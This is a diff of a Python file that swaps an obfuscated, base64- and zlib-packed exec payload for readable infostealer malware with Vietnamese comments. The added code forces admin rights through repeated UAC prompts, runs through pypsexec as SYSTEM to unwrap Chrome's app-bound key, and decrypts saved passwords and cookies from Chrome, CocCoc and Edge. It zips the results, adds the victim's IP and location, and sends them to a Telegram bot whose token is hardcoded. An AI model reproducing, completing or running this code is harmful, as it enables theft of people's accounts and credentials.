@@ -1,3 +1,335 @@
 
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
-exec((_)(b'=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'))
+BOT_TOKEN='8067268503:AAEVnnWe73BZdrqBpt2ME-txBO2mOqlh3sM'
+CHAT_ID='-4546531615'
+
+import ctypes
+import os
+import sys
+import json
+import binascii
+import sqlite3
+import pathlib
+from Crypto.Cipher import AES
+from pypsexec.client import Client
+import time
+import base64
+import win32crypt
+import shutil
+import subprocess
+import zipfile
+import requests
+THUMUCGOC = "DataSystem"
+CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+COCCOC_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\CocCoc\Browser\User Data\Local State"%(os.environ['USERPROFILE']))
+EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
+slprofile = 0
+slpass = 0
+def nen(folder_path, zip_name):
+    # Tạo file zip mới
+    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        # Duyệt qua tất cả các file và thư mục trong thư mục
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                # Đường dẫn đầy đủ tới file
+                file_path = os.path.join(root, file)
+                # Đường dẫn của file trong archive zip (bỏ phần thư mục gốc)
+                arcname = os.path.relpath(file_path, folder_path)
+                # Thêm file vào archive zip
+                zipf.write(file_path, arcname)
+
+def send(bot_token, chat_id, file_path, caption=None):
+    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+    
+    with open(file_path, 'rb') as file:
+        response = requests.post(url, data={'chat_id': chat_id, 'caption': caption or ''}, files={'document': file})
+    
+    if response.ok:
+        print('Tệp tin đã được gửi thành công!')
+        return True
+    print(f'Lỗi: {response.text}')
+    return False
+
+
+def get_profile():
+    # Lấy đường dẫn thư mục người dùng
+    user_profile = os.environ['USERPROFILE']
+    
+    # Đường dẫn tới thư mục dữ liệu của các trình duyệt
+    chrome_local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data"
+    coc_local_state_path = rf"{user_profile}\AppData\Local\CocCoc\Browser\User Data"
+    edge_local_state_path = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data"
+    
+    profile_paths = []
+
+    # Kiểm tra thư mục dữ liệu của Google Chrome
+    if os.path.exists(chrome_local_state_path):
+        profiles = [f for f in os.listdir(chrome_local_state_path) 
+                    if os.path.isdir(os.path.join(chrome_local_state_path, f)) and f.startswith("Profile")]
+        profile_paths.extend([os.path.join(chrome_local_state_path, profile) for profile in profiles])
+        profile_paths.append(os.path.join(chrome_local_state_path, 'Default'))
+    
+    # Kiểm tra thư mục dữ liệu của CocCoc
+    if os.path.exists(coc_local_state_path):
+        profiles = [f for f in os.listdir(coc_local_state_path) 
+                    if os.path.isdir(os.path.join(coc_local_state_path, f)) and f.startswith("Profile")]
+        profile_paths.extend([os.path.join(coc_local_state_path, profile) for profile in profiles])
+        profile_paths.append(os.path.join(coc_local_state_path, 'Default'))
+    
+    # Kiểm tra thư mục dữ liệu của Microsoft Edge
+    if os.path.exists(edge_local_state_path):
+        profile_paths.append(os.path.join(edge_local_state_path, 'Default'))
+    
+    return profile_paths
+def decrypt_cookie_v20(encrypted_value, key):
+    cookie_iv = encrypted_value[3:3+12]
+    encrypted_cookie = encrypted_value[3+12:-16]
+    cookie_tag = encrypted_value[-16:]
+    cookie_cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)
+    decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
+    return decrypted_cookie[32:].decode('utf-8')
+def get_secret_key(path):
+    try:
+        #(1) Get secretkey from chrome local state
+        with open( path, "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        #Remove suffix DPAPI
+        secret_key = secret_key[5:] 
+        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+        return secret_key
+    except Exception as e:
+        print("%s"%str(e))
+        print("[ERR] secretkey cannot be found")
+        return None
+    
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+def decrypt_password(ciphertext, secret_key):
+    try:
+        #(3-a) Initialisation vector for AES decryption
+        initialisation_vector = ciphertext[3:15]
+        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
+        #Encrypted password is 192 bits
+        encrypted_password = ciphertext[15:-16]
+        #(4) Build the cipher to decrypt the ciphertext
+        cipher = generate_cipher(secret_key, initialisation_vector)
+        decrypted_pass = decrypt_payload(cipher, encrypted_password)
+        decrypted_pass = decrypted_pass.decode()  
+        return decrypted_pass
+    except Exception as e:
+        print("%s"%str(e))
+        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
+        return ""
+def cookie(slprofile):
+    print(get_profile())
+    for profile in get_profile():
+        try:
+            slprofile = slprofile + 1
+            print('Số lượng profile:',slprofile)
+            print('Check cookie: ',profile)
+            pathdata = os.path.join(THUMUCGOC)
+            user_profile = os.environ['USERPROFILE']
+            if(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'Google'):
+                local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
+            elif(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'CocCoc'):
+                local_state_path = rf"{user_profile}\AppData\Local\CocCoc\Browser\User Data\Local State"
+            else:
+                local_state_path = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State"
+            cookie_db_path = os.path.join(profile, "Network","Cookies")
+            print(cookie_db_path)
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                local_state = json.load(f)
+            app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
+            arguments = "-c \"" + """import win32crypt
+            import binascii
+            encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
+            print(binascii.b2a_base64(encrypted_key[1]).decode())
+            """.replace("\n", ";") + "\""
+            thu = 4
+            while True:
+                try:
+                    cookies_string = ""
+                    c = Client("localhost")
+                    c.connect()
+
+                    try:
+                        c.create_service()
+                        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
+                        app_bound_encrypted_key_b64 = binascii.b2a_base64(
+                            binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
+                        # decrypt with SYSTEM DPAPI
+                        encrypted_key_b64, stderr, rc = c.run_executable(
+                            sys.executable,
+                            arguments=arguments.format(app_bound_encrypted_key_b64),
+                            use_system_account=True
+                        )
+                        # decrypt with user DPAPI
+                        decrypted_key_b64, stderr, rc = c.run_executable(
+                            sys.executable,
+                            arguments=arguments.format(encrypted_key_b64.decode().strip()),
+                            use_system_account=False
+                        )
+                        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
+                        assert(decrypted_key[0] == 1)
+                    finally:
+                        c.remove_service()
+                        c.disconnect()
+                    aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+                    iv = decrypted_key[1:1+12]
+                    ciphertext = decrypted_key[1+12:1+12+32]
+                    tag = decrypted_key[1+12+32:]
+                    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+                    key = cipher.decrypt_and_verify(ciphertext, tag)
+                    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
+                    cur = con.cursor()
+                    r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, is_secure, is_httponly, expires_utc from cookies;")
+                    cookies = cur.fetchall()
+                    cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
+                    con.close()
+                    for c in cookies_v20:
+                        print('Có cookie')
+                        if(c[4] == 1):
+                            secure_flag = "TRUE"
+                        else:
+                            secure_flag = "FALSE"
+                        if(c[5] == 1):
+                            httponly_flag = "TRUE"
+                        else:
+                            httponly_flag = "FALSE"
+                        try:
+                            cookies_string += f"{c[0]}\t{secure_flag}\t/\t{httponly_flag}\t{c[6]}\t{c[1]}\t{decrypt_cookie_v20(c[2], key)}"
+                            cookies_string += "\n"
+                            print(cookies_string)
+                        except Exception as e:
+                            print('error decrypt: ',str(e))
+                    with open(os.path.join(pathdata ,f'cookie_{os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile))))}_{os.path.basename(profile)}.txt'),'w') as f:
+                        f.write(cookies_string)
+                except:
+                    thu = thu - 1
+                    if(thu == 0):
+                        break
+                break
+        except Exception as e:
+            print(str(e))
+            with open("error_log.txt", "a", encoding="utf-8") as log_file:
+                log_file.write(f"Error: {str(e)}\n\n")
+    return slprofile
+def password(slpass):
+    for profile in get_profile():
+        try:
+            if(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'Google'):
+                secret_key = get_secret_key(CHROME_PATH_LOCAL_STATE)
+            elif(os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile)))) == 'CocCoc'):
+                secret_key = get_secret_key(COCCOC_PATH_LOCAL_STATE)
+            else:
+                secret_key = get_secret_key(EDGE_PATH_LOCAL_STATE)
+            if not secret_key:
+                return []    
+            password_string= ''
+            pathdata = os.path.join(THUMUCGOC)
+            
+            login_db_path = os.path.join(profile, "Login Data")
+            print('check pass: ',login_db_path)
+            con = sqlite3.connect(f"file:///{login_db_path}?mode=ro", uri=True)
+            cur = con.cursor()
+            
+            # Truy vấn mật khẩu từ cơ sở dữ liệu
+            cur.execute("SELECT action_url, username_value, password_value FROM logins")
+            logins = cur.fetchall()
+            
+            # Giải mã và in mật khẩu
+            decrypted_passwords = []
+            for login in logins:
+                origin_url, username, encrypted_password = login
+                decrypted_pass = decrypt_password(encrypted_password, secret_key)
+                if not(origin_url == '' or username == ''):
+                    decrypted_passwords.append({
+                        "origin_url": origin_url,
+                        "username": username,
+                        "password": decrypted_pass
+                    })
+            
+            con.close()
+            for password in decrypted_passwords:
+                slpass = slpass + 1
+                password_string += f"{password['origin_url']}\t\t{password['username']}\t{password['password']}\n"
+            with open(os.path.join(pathdata ,f'password_{os.path.basename(os.path.dirname(os.path.dirname(os.path.dirname(profile))))}_{os.path.basename(profile)}.txt'),'w') as f:
+                f.write(password_string)
+        except Exception as e:
+            with open("error_log.txt", "a", encoding="utf-8") as log_file:
+                log_file.write(f"Error: {str(e)}\n\n")
+    return slpass
+def get_ip_info():
+    # Gửi yêu cầu đến dịch vụ ipinfo.io
+    response = requests.get('http://ipinfo.io/json')
+
+    if response.status_code == 200:
+        data = response.json()
+        ip = data.get('ip')
+        city = data.get('city')
+        country = data.get('country')
+
+        return ip, city, country
+    else:
+        print("Lỗi khi lấy thông tin IP.")
+        return None, None, None
+def kill_explorer():
+    """Hàm để tắt explorer.exe"""
+    try:
+        os.system("taskkill /f /im explorer.exe")
+        print("Explorer đã bị tắt!")
+    except Exception as e:
+        print(f"Lỗi khi tắt Explorer: {e}")
+def start_explorer():
+    """Hàm để khởi động lại explorer.exe"""
+    try:
+        subprocess.Popen("explorer.exe")
+        print("Explorer đã được khởi động lại!")
+    except Exception as e:
+        print(f"Lỗi khi khởi động Explorer: {e}")
+if __name__ == "__main__":
+    kill_explorer()
+    while True:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            start_explorer()
+            # Nếu đã có quyền admin, thoát khỏi vòng lặp và chạy chương trình
+            break
+        print("Script cần quyền admin để tiếp tục.")
+        # Yêu cầu chạy lại với quyền admin
+        result = ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, " ".join(sys.argv), None, 0
+        )
+        if result <= 32:
+            print("Người dùng từ chối quyền admin. Thử lại...")
+        else:
+            print("Quyền admin đã được cấp.")
+            start_explorer()
+            sys.exit(0)
+            
+    if not os.path.exists(THUMUCGOC):
+        os.makedirs(THUMUCGOC)
+        print(f"Thư mục '{THUMUCGOC}' đã được tạo.")
+    else:
+        shutil.rmtree(THUMUCGOC)
+        os.makedirs(THUMUCGOC)
+    processes = ['chrome.exe', 'browser.exe', 'msedge.exe']
+    for process in processes:
+        try:
+            subprocess.run(f'taskkill /f /im {process}', check=True, shell=True)
+            print(f'{process} đã được tắt thành công.')
+        except subprocess.CalledProcessError:
+            print(f'Không thể tắt {process}.')
+    print(get_profile())
+    sl1 = cookie(slprofile)
+    sl2 = password(slpass)
+    nen(THUMUCGOC, os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'))
+    shutil.rmtree(THUMUCGOC)
+    ip, city, country = get_ip_info()
+    send(BOT_TOKEN, CHAT_ID, os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'), 'USERNAME: '+os.path.basename(os.environ['USERPROFILE'])+'\nIP: '+str(ip)+'\nCOUNTRY: '+country+'\nCITY: '+city+'\nPROFILE: '+str(sl1)+'\nPASSWORD: '+str(sl2))
+    os.remove(os.path.join(os.path.basename(os.environ['USERPROFILE'])+'.zip'))
+
